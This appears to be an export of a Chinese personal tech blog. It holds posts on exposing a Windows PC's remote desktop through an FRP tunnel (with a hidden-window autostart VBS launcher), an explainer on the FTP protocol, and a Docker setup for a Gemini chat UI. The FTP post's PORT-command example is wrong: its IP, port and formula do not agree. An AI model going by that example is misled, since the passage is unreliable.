href=\"https://gofrp.org/zh-cn/docs/setup/systemd/\"><strong>点击跳转。</strong></a></p>\n<ol>\n<li>安装 systemd</li>\n</ol>\n<p>如果您的 Linux 服务器上尚未安装 systemd，可以使用包管理器如 yum（适用于 CentOS&#x2F;RHEL）或 apt（适用于 Debian&#x2F;Ubuntu）来安装它：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 使用 yum 安装 systemd（CentOS/RHEL）</span></span><br><span class=\"line\">yum install systemd</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用 apt 安装 systemd（Debian/Ubuntu）</span></span><br><span class=\"line\">apt install systemd</span><br></pre></td></tr></table></figure>\n\n<p>2.创建 frps.service 文件</p>\n<p>使用文本编辑器 (如 vim) 在 &#x2F;etc&#x2F;systemd&#x2F;system 目录下创建一个 frps.service 文件，用于配置 frps 服务。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim /etc/systemd/system/frps.service</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>写入内容</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\"><span class=\"comment\"># 服务名称，可自定义</span></span><br><span class=\"line\">Description = frp server</span><br><span class=\"line\">After = network.target syslog.target</span><br><span class=\"line\">Wants = network.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">Type = simple</span><br><span class=\"line\"><span class=\"comment\"># 启动frps的命令，需修改为您的frps的安装路径</span></span><br><span class=\"line\">ExecStart = /path/to/frps -c /path/to/frps.toml</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy = multi-user.target</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>然后就可以像管理其他服务一样，使用systemctl命令来管理frps了。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 启动frp</span></span><br><span class=\"line\">sudo systemctl start frps</span><br><span class=\"line\"><span class=\"comment\"># 停止frp</span></span><br><span class=\"line\">sudo systemctl stop frps</span><br><span class=\"line\"><span class=\"comment\"># 重启frp</span></span><br><span class=\"line\">sudo systemctl restart frps</span><br><span class=\"line\"><span class=\"comment\"># 查看frp状态</span></span><br><span class=\"line\">sudo systemctl status frps</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"客户端（Windows）安装FRP\"><a href=\"#客户端（Windows）安装FRP\" class=\"headerlink\" title=\"客户端（Windows）安装FRP\"></a>客户端（Windows）安装FRP</h3><p><a href=\"https://github.com/fatedier/frp/releases/download/v0.53.0/frp_0.53.0_windows_amd64.zip\">0.53.0官方Windows下载链接，点击下载</a><br>同样的，访问Github有困难的话，可以使用百度网盘下载，<a href=\"https://pan.baidu.com/s/11-wDw4l_augPWeAf9OcTGA?pwd=kstm\"><strong>客户端百度网盘链接，点击跳转</strong></a> 提取码：kstm</p>\n<h3 id=\"客户端配置文件修改\"><a href=\"#客户端配置文件修改\" class=\"headerlink\" title=\"客户端配置文件修改\"></a>客户端配置文件修改</h3><p>下载解压后，除了你们没有如图所示的第一个文件外，其他应该都一样。</p>\n<p><img src=\"/2024/01/14/frp/2.png\" alt=\"客户端文件展示\"></p>\n<figure class=\"highlight toml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">serverAddr</span> = <span class=\"string\">&quot;123.56.10.1&quot;</span>  <span class=\"comment\"># 服务器地址，填写自己真实的VPS地址</span></span><br><span class=\"line\"><span class=\"attr\">serverPort</span> = <span class=\"number\">7000</span>           <span class=\"comment\"># 服务器端口，与服务端配置的端口一致</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[[proxies]]</span></span><br><span class=\"line\"><span class=\"attr\">name</span> = <span class=\"string\">&quot;HP-desktop&quot;</span>         <span class=\"comment\"># 备注，随便写</span></span><br><span class=\"line\"><span class=\"attr\">type</span> = <span class=\"string\">&quot;tcp&quot;</span>                <span class=\"comment\"># 类型，不要变</span></span><br><span class=\"line\"><span class=\"attr\">localIP</span> = <span class=\"string\">&quot;127.0.0.1&quot;</span>       <span class=\"comment\"># 不要变</span></span><br><span class=\"line\"><span class=\"attr\">localPort</span> = <span class=\"number\">3389</span>            <span class=\"comment\"># 本地端口，不要变</span></span><br><span class=\"line\"><span class=\"attr\">remotePort</span> = <span class=\"number\">10086</span>          <span class=\"comment\"># 远程端口，自己设，比如设置为10086，以后访问这台Windows就是输入123.56.10.1:10086。</span></span><br></pre></td></tr></table></figure>\n\n<p>使用起来是和服务器端一样的，只不过这次需要运行客户端的文件。在当前目录鼠标右击打开CMD，然后如图所示运行（一定要看清楚运行的是 <strong>frpc</strong> 的文件）。</p>\n<p><img src=\"/2024/01/14/frp/3.png\" alt=\"客户端文件展示\"></p>\n<h3 id=\"设置Windows无窗口启动\"><a href=\"#设置Windows无窗口启动\" class=\"headerlink\" title=\"设置Windows无窗口启动\"></a>设置Windows无窗口启动</h3><p>这也就是为什么我会多出来一个.vbs文件。话不多说，放码出去。</p>\n<figure class=\"highlight vbs\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">Set</span> WShell = <span class=\"built_in\">CreateObject</span>(<span class=\"string\">&quot;WScript.Shell&quot;</span>)</span><br><span class=\"line\">command = <span class=\"string\">&quot;frpc.exe&quot;</span></span><br><span class=\"line\">arguments = <span class=\"string\">&quot;-c frpc.toml&quot;</span></span><br><span class=\"line\">fullCommand = command &amp; <span class=\"string\">&quot; &quot;</span> &amp; arguments</span><br><span class=\"line\">WShell.Run fullCommand, <span class=\"number\">0</span>, <span class=\"literal\">False</span></span><br><span class=\"line\"><span class=\"keyword\">Set</span> WShell = <span class=\"literal\">Nothing</span></span><br></pre></td></tr></table></figure>\n\n<p>想启动服务直接双击这个.vbs文件即可，如果想达到开机自启动，可以将这个.vbs文件放到开机计划中。</p>\n<ol>\n<li>首先创建好快捷方式。</li>\n<li><kbd>Win</kbd>+<kbd>R</kbd>输入<code>shell:startup</code>，直接回车。</li>\n<li>将快捷方式放入这个文件夹中，大功告成。</li>\n</ol>\n<h3 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h3><p><kbd>Win</kbd>+<kbd>Q</kbd>搜索“远程桌面连接”，输入IP以及端口号，如果没毛病的话，就是如下的效果。如果有什么问题，可以评论区留言。</p>\n<p><img src=\"/2024/01/14/frp/5.png\" alt=\"客户端文件展示\"></p>\n<p>最后输入被控电脑的用户名和密码进行登录。</p>\n<hr>\n<hr>\n<h3 id=\"易错点\"><a href=\"#易错点\" class=\"headerlink\" title=\"易错点\"></a>易错点</h3><ol>\n<li><p>以上面的教程为例，VPS 是需要打开 7000 端口和 10086 端口的，放行这两个端口，否则无法连接。</p>\n</li>\n<li><p>Windows 家庭版无法使用远程桌面，要么重新安装 Windows 专业版，要么使用专业版激活码重新激活。</p>\n</li>\n</ol>"},{"title":"FTP协议","date":"2023-10-06T02:42:03.000Z","_content":"\nFTP协议，文件传输协议，file transfer protocol，是网络文件传输协议，用于在网络中传输文件。\n\n<!-- more -->\n\n### 连接建立\n\nFTP协议与别的协议有所差异，FTP协议工作需要两个端口工作，也就是需要在客户端和服务器端建立两个连接，这两个连接分别是：控制连接、数据连接。\n\n控制连接一般使用21端口不变，而数据连接使用的端口是会随着FTP服务器工作模式的不同而改变的。\n\n在客户端和FTP服务器工作时，通常控制连接只会建立一次，在开始时建立连接，在客户端发送`QUIT`指令后断开连接。但是数据连接有可能会建立多次，通常与FTP建立连接时，并不会默认将数据连接也建立，只有当有文件传输的任务时，才会建立数据连接，当文件传输完毕，数据连接又会断开，知道下一个传输任务开始时，再建立数据连接。\n\n### 工作模式\n\nFTP协议有两种工作模式：主动模式和被动模式。这两种模式是讲服务器的主动和被动。\n\n#### 主动模式\n\n在主动模式下，客户端通过控制连接发送`PORT`命令告知服务器自己的IP和打开的端口，之后服务器主动连接客户端，这时服务器使用的就是默认的20端口去建立数据连接。\n\n而客户端使用的`PORT`命令并不是直接告知服务器自己的`IP:PORT`，而是这样的模式`PORT 123,57,54,43,8`，这个命令指定的IP便是`123.57.54.43`，而端口是`2060`，这是需要计算的，公式为`2060=8*256+12`。\n\n主动模式的缺点就是服务器发起的数据连接请求有可能会被客户端的防火墙进行拦截。\n\n#### 被动模式\n\n在被动模式下，客户端通过控制连接发送`PASV`命令告知服务器处于被动模式。服务器收到命令后，会在本地随机开启一个端口，处于监听状态，并通过控制连接告知客户端。客户端便可以通过这个端口与服务器建立数据连接。\n\n所以当FTP服务器处于被动模式的情况下，数据连接的端口便不再是20端口，而是一个随机的端口。\n\n因为连接是通过客户端主机主动发起的，所以数据连接不会被客户端的防火墙拦截。\n\n### 命令\n\n常见的FTP命令：\n- `USER`: 用户名\n- `PASS`: 密码\n- `LIST`: 列出目录\n- `CWD`: 切换目录\n- `CDUP`: 返回上一级目录\n- `RETR`: 下载文件\n- `STOR`: 上传文件\n- `DELE`: 删除文件\n- `MKD`: 创建目录\n- `RMD`: 删除目录\n- `QUIT`: 退出","source":"_posts/ftp.md","raw":"---\ntitle: FTP协议\ndate: 2023-10-06 10:42:03\ncategories: 理论知识\ntags:\n  - 面试\n  - 网络基础\n---\n\nFTP协议，文件传输协议，file transfer protocol，是网络文件传输协议，用于在网络中传输文件。\n\n<!-- more -->\n\n### 连接建立\n\nFTP协议与别的协议有所差异，FTP协议工作需要两个端口工作，也就是需要在客户端和服务器端建立两个连接，这两个连接分别是：控制连接、数据连接。\n\n控制连接一般使用21端口不变，而数据连接使用的端口是会随着FTP服务器工作模式的不同而改变的。\n\n在客户端和FTP服务器工作时，通常控制连接只会建立一次，在开始时建立连接，在客户端发送`QUIT`指令后断开连接。但是数据连接有可能会建立多次，通常与FTP建立连接时，并不会默认将数据连接也建立，只有当有文件传输的任务时，才会建立数据连接，当文件传输完毕，数据连接又会断开，知道下一个传输任务开始时，再建立数据连接。\n\n### 工作模式\n\nFTP协议有两种工作模式：主动模式和被动模式。这两种模式是讲服务器的主动和被动。\n\n#### 主动模式\n\n在主动模式下，客户端通过控制连接发送`PORT`命令告知服务器自己的IP和打开的端口，之后服务器主动连接客户端，这时服务器使用的就是默认的20端口去建立数据连接。\n\n而客户端使用的`PORT`命令并不是直接告知服务器自己的`IP:PORT`，而是这样的模式`PORT 123,57,54,43,8`，这个命令指定的IP便是`123.57.54.43`，而端口是`2060`，这是需要计算的，公式为`2060=8*256+12`。\n\n主动模式的缺点就是服务器发起的数据连接请求有可能会被客户端的防火墙进行拦截。\n\n#### 被动模式\n\n在被动模式下，客户端通过控制连接发送`PASV`命令告知服务器处于被动模式。服务器收到命令后，会在本地随机开启一个端口，处于监听状态，并通过控制连接告知客户端。客户端便可以通过这个端口与服务器建立数据连接。\n\n所以当FTP服务器处于被动模式的情况下，数据连接的端口便不再是20端口，而是一个随机的端口。\n\n因为连接是通过客户端主机主动发起的，所以数据连接不会被客户端的防火墙拦截。\n\n### 命令\n\n常见的FTP命令：\n- `USER`: 用户名\n- `PASS`: 密码\n- `LIST`: 列出目录\n- `CWD`: 切换目录\n- `CDUP`: 返回上一级目录\n- `RETR`: 下载文件\n- `STOR`: 上传文件\n- `DELE`: 删除文件\n- `MKD`: 创建目录\n- `RMD`: 删除目录\n- `QUIT`: 退出","slug":"ftp","published":1,"updated":"2024-05-03T03:55:54.849Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5fi005f7zj3audj3wbe","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>FTP协议，文件传输协议，file transfer protocol，是网络文件传输协议，用于在网络中传输文件。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"连接建立\"><a href=\"#连接建立\" class=\"headerlink\" title=\"连接建立\"></a>连接建立</h3><p>FTP协议与别的协议有所差异，FTP协议工作需要两个端口工作，也就是需要在客户端和服务器端建立两个连接，这两个连接分别是：控制连接、数据连接。</p>\n<p>控制连接一般使用21端口不变，而数据连接使用的端口是会随着FTP服务器工作模式的不同而改变的。</p>\n<p>在客户端和FTP服务器工作时，通常控制连接只会建立一次，在开始时建立连接，在客户端发送<code>QUIT</code>指令后断开连接。但是数据连接有可能会建立多次，通常与FTP建立连接时，并不会默认将数据连接也建立，只有当有文件传输的任务时，才会建立数据连接，当文件传输完毕，数据连接又会断开，知道下一个传输任务开始时，再建立数据连接。</p>\n<h3 id=\"工作模式\"><a href=\"#工作模式\" class=\"headerlink\" title=\"工作模式\"></a>工作模式</h3><p>FTP协议有两种工作模式：主动模式和被动模式。这两种模式是讲服务器的主动和被动。</p>\n<h4 id=\"主动模式\"><a href=\"#主动模式\" class=\"headerlink\" title=\"主动模式\"></a>主动模式</h4><p>在主动模式下，客户端通过控制连接发送<code>PORT</code>命令告知服务器自己的IP和打开的端口，之后服务器主动连接客户端，这时服务器使用的就是默认的20端口去建立数据连接。</p>\n<p>而客户端使用的<code>PORT</code>命令并不是直接告知服务器自己的<code>IP:PORT</code>，而是这样的模式<code>PORT 123,57,54,43,8</code>，这个命令指定的IP便是<code>123.57.54.43</code>，而端口是<code>2060</code>，这是需要计算的，公式为<code>2060=8*256+12</code>。</p>\n<p>主动模式的缺点就是服务器发起的数据连接请求有可能会被客户端的防火墙进行拦截。</p>\n<h4 id=\"被动模式\"><a href=\"#被动模式\" class=\"headerlink\" title=\"被动模式\"></a>被动模式</h4><p>在被动模式下，客户端通过控制连接发送<code>PASV</code>命令告知服务器处于被动模式。服务器收到命令后，会在本地随机开启一个端口，处于监听状态，并通过控制连接告知客户端。客户端便可以通过这个端口与服务器建立数据连接。</p>\n<p>所以当FTP服务器处于被动模式的情况下，数据连接的端口便不再是20端口，而是一个随机的端口。</p>\n<p>因为连接是通过客户端主机主动发起的，所以数据连接不会被客户端的防火墙拦截。</p>\n<h3 id=\"命令\"><a href=\"#命令\" class=\"headerlink\" title=\"命令\"></a>命令</h3><p>常见的FTP命令：</p>\n<ul>\n<li><code>USER</code>: 用户名</li>\n<li><code>PASS</code>: 密码</li>\n<li><code>LIST</code>: 列出目录</li>\n<li><code>CWD</code>: 切换目录</li>\n<li><code>CDUP</code>: 返回上一级目录</li>\n<li><code>RETR</code>: 下载文件</li>\n<li><code>STOR</code>: 上传文件</li>\n<li><code>DELE</code>: 删除文件</li>\n<li><code>MKD</code>: 创建目录</li>\n<li><code>RMD</code>: 删除目录</li>\n<li><code>QUIT</code>: 退出</li>\n</ul>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>FTP协议，文件传输协议，file transfer protocol，是网络文件传输协议，用于在网络中传输文件。</p>","more":"<h3 id=\"连接建立\"><a href=\"#连接建立\" class=\"headerlink\" title=\"连接建立\"></a>连接建立</h3><p>FTP协议与别的协议有所差异，FTP协议工作需要两个端口工作，也就是需要在客户端和服务器端建立两个连接，这两个连接分别是：控制连接、数据连接。</p>\n<p>控制连接一般使用21端口不变，而数据连接使用的端口是会随着FTP服务器工作模式的不同而改变的。</p>\n<p>在客户端和FTP服务器工作时，通常控制连接只会建立一次，在开始时建立连接，在客户端发送<code>QUIT</code>指令后断开连接。但是数据连接有可能会建立多次，通常与FTP建立连接时，并不会默认将数据连接也建立，只有当有文件传输的任务时，才会建立数据连接，当文件传输完毕，数据连接又会断开，知道下一个传输任务开始时，再建立数据连接。</p>\n<h3 id=\"工作模式\"><a href=\"#工作模式\" class=\"headerlink\" title=\"工作模式\"></a>工作模式</h3><p>FTP协议有两种工作模式：主动模式和被动模式。这两种模式是讲服务器的主动和被动。</p>\n<h4 id=\"主动模式\"><a href=\"#主动模式\" class=\"headerlink\" title=\"主动模式\"></a>主动模式</h4><p>在主动模式下，客户端通过控制连接发送<code>PORT</code>命令告知服务器自己的IP和打开的端口，之后服务器主动连接客户端，这时服务器使用的就是默认的20端口去建立数据连接。</p>\n<p>而客户端使用的<code>PORT</code>命令并不是直接告知服务器自己的<code>IP:PORT</code>，而是这样的模式<code>PORT 123,57,54,43,8</code>，这个命令指定的IP便是<code>123.57.54.43</code>，而端口是<code>2060</code>，这是需要计算的，公式为<code>2060=8*256+12</code>。</p>\n<p>主动模式的缺点就是服务器发起的数据连接请求有可能会被客户端的防火墙进行拦截。</p>\n<h4 id=\"被动模式\"><a href=\"#被动模式\" class=\"headerlink\" title=\"被动模式\"></a>被动模式</h4><p>在被动模式下，客户端通过控制连接发送<code>PASV</code>命令告知服务器处于被动模式。服务器收到命令后，会在本地随机开启一个端口，处于监听状态，并通过控制连接告知客户端。客户端便可以通过这个端口与服务器建立数据连接。</p>\n<p>所以当FTP服务器处于被动模式的情况下，数据连接的端口便不再是20端口，而是一个随机的端口。</p>\n<p>因为连接是通过客户端主机主动发起的，所以数据连接不会被客户端的防火墙拦截。</p>\n<h3 id=\"命令\"><a href=\"#命令\" class=\"headerlink\" title=\"命令\"></a>命令</h3><p>常见的FTP命令：</p>\n<ul>\n<li><code>USER</code>: 用户名</li>\n<li><code>PASS</code>: 密码</li>\n<li><code>LIST</code>: 列出目录</li>\n<li><code>CWD</code>: 切换目录</li>\n<li><code>CDUP</code>: 返回上一级目录</li>\n<li><code>RETR</code>: 下载文件</li>\n<li><code>STOR</code>: 上传文件</li>\n<li><code>DELE</code>: 删除文件</li>\n<li><code>MKD</code>: 创建目录</li>\n<li><code>RMD</code>: 删除目录</li>\n<li><code>QUIT</code>: 退出</li>\n</ul>"},{"title":"利用 Docker 搭建本地的 Gemini","date":"2023-12-20T12:02:59.000Z","_content":"\n之前利用 Docker 搭建了本地了 ChatGPT，具体的搭建步骤可以查看[**利用docker搭建本地的chatGPT**](https://nustarain.gitee.io/2023/09/12/LocalchatGPT/)。\n\n这次利用 Docker 来搭建 Google 公司推出的 Gemini 聊天机器人。\n\n### 搭建步骤\n\n1. 使用 Google 账号注册 Gemini，[**Gemini官网地址**](https://deepmind.google/technologies/gemini/#introduction)。\n\n<!-- more -->\n\n2. 跳转到[**这个页面**](https://ai.google.dev/) 准备进行 API 的获取。\n\n![gemini](./gemini/1.png)\n\n3. 进入这个页面后获取 API，到此，最复杂的就完事了。\n\n![gemini](./gemini/2.png)\n\n4. 拉取镜像\n\n```bash\ndocker pull howie6879/geminiprochat:v0.1.0\n```\n\n5. 运行容器\n\n```bash\ndocker run --name geminiprochat \\\n--restart always \\\n-p 3030:3000 \\\n-itd \\\n-e GEMINI_API_KEY=xxx \\\nhowie6879/geminiprochat:v0.1.0\n```\n\nGEMINI_API_KEY=xxx 把“xxx”换成自己的 API 就 OK 了。端口的话也可以根据喜好修改。\n\n6. 打开浏览器访问，效果如下\n\n![gemini](./gemini/3.png)\n\n### 优劣对比\n\nChatGPT 本地搭建需要一段时间就重新获取一下 token 值，但是 Gemini 不需要重复获取 token 值。\n\nChatGPT 可以同时创建很多会话，但是 Gemini 只能有一个会话。\n\nChatGPT 不能联网，Gemini 是联网的，但是数据只到2023年3月。","source":"_posts/gemini.md","raw":"---\ntitle: 利用 Docker 搭建本地的 Gemini\ndate: 2023-12-20 20:02:59\ncategories: 小玩意儿\ntags:\n  - AI\n---\n\n之前利用 Docker 搭建了本地了 ChatGPT，具体的搭建步骤可以查看[**利用docker搭建本地的chatGPT**](https://nustarain.gitee.io/2023/09/12/LocalchatGPT/)。\n\n这次利用 Docker 来搭建 Google 公司推出的 Gemini 聊天机器人。\n\n### 搭建步骤\n\n1. 使用 Google 账号注册 Gemini，[**Gemini官网地址**](https://deepmind.google/technologies/gemini/#introduction)。\n\n<!-- more -->\n\n2. 跳转到[**这个页面**](https://ai.google.dev/) 准备进行 API 的获取。\n\n![gemini](./gemini/1.png)\n\n3. 进入这个页面后获取 API，到此，最复杂的就完事了。\n\n![gemini](./gemini/2.png)\n\n4. 拉取镜像\n\n```bash\ndocker pull howie6879/geminiprochat:v0.1.0\n```\n\n5. 运行容器\n\n```bash\ndocker run --name geminiprochat \\\n--restart always \\\n-p 3030:3000 \\\n-itd \\\n-e GEMINI_API_KEY=xxx \\\nhowie6879/geminiprochat:v0.1.0\n```\n\nGEMINI_API_KEY=xxx 把“xxx”换成自己的 API 就 OK 了。端口的话也可以根据喜好修改。\n\n6. 打开浏览器访问，效果如下\n\n![gemini](./gemini/3.png)\n\n### 优劣对比\n\nChatGPT 本地搭建需要一段时间就重新获取一下 token 值，但是 Gemini 不需要重复获取 token 值。\n\nChatGPT 可以同时创建很多会话，但是 Gemini 只能有一个会话。\n\nChatGPT 不能联网，Gemini 是联网的，但是数据只到2023年3月。","slug":"gemini","published":1,"updated":"2024-05-03T03:55:54.849Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5fk005j7zj373evbj34","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>之前利用 Docker 搭建了本地了 ChatGPT，具体的搭建步骤可以查看<a href=\"https://nustarain.gitee.io/2023/09/12/LocalchatGPT/\"><strong>利用docker搭建本地的chatGPT</strong></a>。</p>\n<p>这次利用 Docker 来搭建 Google 公司推出的 Gemini 聊天机器人。</p>\n<h3 id=\"搭建步骤\"><a href=\"#搭建步骤\" class=\"headerlink\" title=\"搭建步骤\"></a>搭建步骤</h3><ol>\n<li>使用 Google 账号注册 Gemini，<a href=\"https://deepmind.google/technologies/gemini/#introduction\"><strong>Gemini官网地址</strong></a>。</li>\n</ol>\n<span id=\"more\"></span>\n\n<ol start=\"2\">\n<li>跳转到<a href=\"https://ai.google.dev/\"><strong>这个页面</strong></a> 准备进行 API 的获取。</li>\n</ol>\n<p><img src=\"/2023/12/20/gemini/1.png\" alt=\"gemini\"></p>\n<ol start=\"3\">\n<li>进入这个页面后获取 API，到此，最复杂的就完事了。</li>\n</ol>\n<p><img src=\"/2023/12/20/gemini/2.png\" alt=\"gemini\"></p>\n<ol start=\"4\">\n<li>拉取镜像</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull howie6879/geminiprochat:v0.1.0</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>运行容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run --name geminiprochat \\</span><br><span class=\"line\">--restart always \\</span><br><span class=\"line\">-p 3030:3000 \\</span><br><span class=\"line\">-itd \\</span><br><span class=\"line\">-e GEMINI_API_KEY=xxx \\</span><br><span class=\"line\">howie6879/geminiprochat:v0.1.0</span><br></pre></td></tr></table></figure>\n\n<p>GEMINI_API_KEY&#x3D;xxx 把“xxx”换成自己的 API 就 OK 了。端口的话也可以根据喜好修改。</p>\n<ol start=\"6\">\n<li>打开浏览器访问，效果如下</li>\n</ol>\n<p><img src=\"/2023/12/20/gemini/3.png\" alt=\"gemini\"></p>\n<h3 id=\"优劣对比\"><a href=\"#优劣对比\" class=\"headerlink\" title=\"优劣对比\"></a>优劣对比</h3><p>ChatGPT 本地搭建需要一段时间就重新获取一下 token 值，但是 Gemini 不需要重复获取 token 值。</p>\n<p>ChatGPT 可以同时创建很多会话，但是 Gemini 只能有一个会话。</p>\n<p>ChatGPT 不能联网，Gemini 是联网的，但是数据只到2023年3月。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  